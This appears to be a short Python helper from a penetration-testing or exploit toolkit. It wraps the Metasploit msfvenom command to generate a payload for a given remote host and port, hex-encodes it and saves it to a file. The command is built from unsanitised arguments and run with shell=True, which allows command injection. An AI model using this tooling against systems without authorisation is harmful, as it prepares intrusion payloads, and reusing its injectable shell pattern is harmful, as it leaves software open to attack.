import subprocess

def msfvenom(payload, rhost, rport, ruri):
    print(f"msfvenom is generating payload for {payload} ...")
    RURI_part = f" RURI={ruri}" if ruri else ""
    command = f"msfvenom -p {payload} RHOST={rhost} RPORT={rport} {RURI_part} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
    subprocess.run(command, shell=True, check=True)